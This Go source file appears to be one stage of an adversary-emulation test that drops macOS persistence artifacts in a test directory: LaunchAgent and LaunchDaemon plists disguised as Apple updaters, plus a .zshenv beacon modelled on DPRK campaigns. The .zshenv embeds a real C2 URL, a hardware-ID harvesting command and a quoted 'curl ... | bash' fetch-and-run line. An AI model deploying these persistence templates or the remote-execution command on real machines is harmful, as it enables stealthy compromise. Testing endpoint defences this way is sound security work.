//go:build darwin
// +build darwin

/*
STAGE 2: LaunchAgent Installation / Persistence (T1543.004)
Simulates RustBucket LaunchAgent persistence at
~/Library/LaunchAgents/com.apple.systemupdate.plist
and Hidden Risk .zshenv persistence (bypasses Login Items notification).
Also simulates LaunchDaemon installation attempt for root persistence.
*/

package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
)

const (
	TEST_UUID      = "244dfb88-9068-4db4-9fa8-dbc49517f63d"
	TECHNIQUE_ID   = "T1543.004"
	TECHNIQUE_NAME = "Create or Modify System Process: Launch Agent"
	STAGE_ID       = 2
)

// Standardized stage exit codes
const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))

	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Starting %s", TECHNIQUE_NAME))
	LogStageStart(STAGE_ID, TECHNIQUE_ID, "Simulate LaunchAgent and .zshenv persistence")

	fmt.Printf("[STAGE %s] Starting LaunchAgent Persistence Installation\n", TECHNIQUE_ID)

	if err := performTechnique(); err != nil {
		if isBlockedError(err) {
			fmt.Printf("[STAGE %s] Technique blocked: %v\n", TECHNIQUE_ID, err)
			LogMessage("BLOCKED", TECHNIQUE_ID, fmt.Sprintf("Technique blocked: %v", err))
			LogStageBlocked(STAGE_ID, TECHNIQUE_ID, err.Error())
			os.Exit(StageBlocked)
		}

		fmt.Printf("[STAGE %s] Technique failed: %v\n", TECHNIQUE_ID, err)
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Technique failed: %v", err))
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", err.Error())
		os.Exit(StageError)
	}

	fmt.Printf("[STAGE %s] Persistence mechanisms installed successfully\n", TECHNIQUE_ID)
	LogMessage("SUCCESS", TECHNIQUE_ID, fmt.Sprintf("%s executed successfully", TECHNIQUE_NAME))
	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "Persistence mechanisms installed without prevention")
	os.Exit(StageSuccess)
}

func performTechnique() error {
	targetDir := "/tmp/F0"
	artifactDir := "/Users/fortika-test"

	if err := os.MkdirAll(targetDir, 0755); err != nil {
		return fmt.Errorf("failed to create target directory: %v", err)
	}
	if err := os.MkdirAll(artifactDir, 0755); err != nil {
		return fmt.Errorf("failed to create artifact directory: %v", err)
	}

	// --- Persistence 1: RustBucket LaunchAgent ---
	LogMessage("INFO", TECHNIQUE_ID, "Phase 1: Creating RustBucket LaunchAgent plist")
	fmt.Printf("[STAGE %s] Phase 1: RustBucket LaunchAgent plist\n", TECHNIQUE_ID)

	// Exact pattern used by RustBucket/BlueNoroff
	launchAgentPlist := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.systemupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Users/Shared/.system/com.apple.systemupdate</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key>
        <false/>
    </dict>
    <key>StandardOutPath</key>
    <string>/tmp/.sysupdate.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/.sysupdate.err</string>
</dict>
</plist>`

	// Write to simulated LaunchAgents directory
	launchAgentsDir := filepath.Join(artifactDir, "Library", "LaunchAgents")
	if err := os.MkdirAll(launchAgentsDir, 0755); err != nil {
		return fmt.Errorf("failed to create LaunchAgents directory: %v", err)
	}

	launchAgentPath := filepath.Join(launchAgentsDir, "com.apple.systemupdate.plist")
	if err := os.WriteFile(launchAgentPath, []byte(launchAgentPlist), 0644); err != nil {
		return fmt.Errorf("failed to write LaunchAgent plist: %v", err)
	}
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Created LaunchAgent: %s", launchAgentPath))

	// Verify plist survived
	time.Sleep(2 * time.Second)
	if _, err := os.Stat(launchAgentPath); os.IsNotExist(err) {
		return fmt.Errorf("LaunchAgent plist quarantined: removed by security controls")
	}

	// --- Persistence 2: BeaverTail LaunchAgent ---
	LogMessage("INFO", TECHNIQUE_ID, "Phase 2: Creating BeaverTail/InvisibleFerret LaunchAgent plist")
	fmt.Printf("[STAGE %s] Phase 2: BeaverTail LaunchAgent plist\n", TECHNIQUE_ID)

	beaverTailPlist := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.avatar.update.wake</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/local/bin/python3</string>
        <string>/Users/Shared/.invisible_ferret/main.py</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StartInterval</key>
    <integer>300</integer>
</dict>
</plist>`

	beaverTailPath := filepath.Join(launchAgentsDir, "com.avatar.update.wake.plist")
	if err := os.WriteFile(beaverTailPath, []byte(beaverTailPlist), 0644); err != nil {
		return fmt.Errorf("failed to write BeaverTail plist: %v", err)
	}
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Created BeaverTail LaunchAgent: %s", beaverTailPath))

	// --- Persistence 3: Hidden Risk .zshenv modification ---
	LogMessage("INFO", TECHNIQUE_ID, "Phase 3: Simulating .zshenv persistence (Hidden Risk campaign)")
	fmt.Printf("[STAGE %s] Phase 3: .zshenv persistence (bypasses Login Items notification)\n", TECHNIQUE_ID)

	// Hidden Risk campaign (Nov 2024, SentinelLabs) abuses ~/.zshenv
	// .zshenv executes for EVERY Zsh session and does NOT trigger
	// macOS Ventura's background Login Items notification
	zshenvContent := `# SIMULATION - Hidden Risk Campaign .zshenv Persistence
# Threat Actor: BlueNoroff/Lazarus (DPRK)
# Reference: SentinelLabs Nov 2024
#
# .zshenv executes for EVERY new Zsh session (interactive and non-interactive)
# CRITICAL: Does NOT trigger macOS Ventura background Login Items notification
# This makes it invisible to the user

# Original .zshenv content preserved above (if any)

# --- Hidden Risk Payload ---
export HIDDEN_RISK_C2="https://app.linkpc.net/check"
export HIDDEN_RISK_HWID=$(ioreg -d2 -c IOPlatformExpertDevice | awk -F\" '/IOPlatformUUID/{print $(NF-1)}')

# Beacon function (simulated)
_update_check() {
    # In real attack: curl -s "$HIDDEN_RISK_C2?hwid=$HIDDEN_RISK_HWID" | bash
    echo "[Hidden Risk] Beacon sent to C2 (simulated)"
}

# Execute on shell startup
_update_check &>/dev/null &
# --- End Hidden Risk Payload ---
`

	// Write to simulated home directory
	zshenvPath := filepath.Join(artifactDir, ".zshenv")
	if err := os.WriteFile(zshenvPath, []byte(zshenvContent), 0644); err != nil {
		return fmt.Errorf("failed to write .zshenv: %v", err)
	}
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Created .zshenv persistence: %s", zshenvPath))
	LogMessage("INFO", TECHNIQUE_ID, "NOTE: .zshenv bypasses macOS Ventura Login Items notification")

	// Verify .zshenv survived
	time.Sleep(2 * time.Second)
	if _, err := os.Stat(zshenvPath); os.IsNotExist(err) {
		return fmt.Errorf(".zshenv file quarantined: removed by security controls")
	}

	// --- Persistence 4: Simulated LaunchDaemon (root persistence) ---
	LogMessage("INFO", TECHNIQUE_ID, "Phase 4: Simulating LaunchDaemon installation attempt")
	fmt.Printf("[STAGE %s] Phase 4: LaunchDaemon (root persistence) attempt\n", TECHNIQUE_ID)

	launchDaemonPlist := `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.security.updateagent</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Library/Application Support/.security/updateagent</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>UserName</key>
    <string>root</string>
</dict>
</plist>`

	// Simulate placement in LaunchDaemons directory
	launchDaemonsDir := filepath.Join(artifactDir, "Library", "LaunchDaemons")
	if err := os.MkdirAll(launchDaemonsDir, 0755); err != nil {
		return fmt.Errorf("failed to create LaunchDaemons directory: %v", err)
	}

	launchDaemonPath := filepath.Join(launchDaemonsDir, "com.apple.security.updateagent.plist")
	if err := os.WriteFile(launchDaemonPath, []byte(launchDaemonPlist), 0644); err != nil {
		return fmt.Errorf("failed to write LaunchDaemon plist: %v", err)
	}
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Created LaunchDaemon: %s", launchDaemonPath))

	// Log persistence summary
	LogMessage("INFO", TECHNIQUE_ID, "Persistence summary:")
	LogMessage("INFO", TECHNIQUE_ID, "  1. LaunchAgent: com.apple.systemupdate (RustBucket)")
	LogMessage("INFO", TECHNIQUE_ID, "  2. LaunchAgent: com.avatar.update.wake (BeaverTail)")
	LogMessage("INFO", TECHNIQUE_ID, "  3. .zshenv modification (Hidden Risk - stealth)")
	LogMessage("INFO", TECHNIQUE_ID, "  4. LaunchDaemon: com.apple.security.updateagent (root)")

	// Final artifact verification
	artifacts := []string{launchAgentPath, beaverTailPath, zshenvPath, launchDaemonPath}
	for _, artifact := range artifacts {
		if _, err := os.Stat(artifact); os.IsNotExist(err) {
			return fmt.Errorf("persistence artifact quarantined: %s removed by security controls", filepath.Base(artifact))
		}
	}

	LogMessage("SUCCESS", TECHNIQUE_ID, "All 4 persistence mechanisms installed and survived AV scanning")
	return nil
}

func isBlockedError(err error) bool {
	errStr := strings.ToLower(err.Error())
	// Only match EDR/AV-specific indicators, NOT standard OS errors.
	// "permission denied" and "operation not permitted" are standard POSIX errors
	// from filesystem operations — not EDR blocks. On Linux/macOS, EDR blocks manifest
	// as process kills (SIGKILL), file quarantine (file disappears), or security
	// policy enforcement — never as simple EACCES/EPERM on mkdir/write.
	blockedPatterns := []string{
		"quarantined", "blocked by security", "blocked by endpoint",
		"malware detected", "threat detected", "security policy",
	}
	for _, pattern := range blockedPatterns {
		if strings.Contains(errStr, pattern) {
			return true
		}
	}
	return false
}
